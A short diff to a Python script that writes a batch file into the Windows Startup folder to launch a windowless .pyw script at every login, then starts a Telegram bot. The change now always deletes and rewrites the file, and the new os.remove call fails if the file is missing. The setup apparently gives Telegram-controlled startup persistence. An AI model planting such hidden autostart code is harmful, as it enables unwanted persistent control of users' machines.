@@ -124,9 +124,9 @@ x.append("Startup")
 x.append("autoStartWin.bat")
 x='\\'.join(x)
 
-if not os.path.isfile(x):
-    with open(x,"w+") as bat_file:
-        bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")
+os.remove(x)
+with open(x,"w+") as bat_file:
+    bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")
 bot = telebot.TeleBot(tok)
 @bot.message_handler(commands="start")
 def keyb(message):
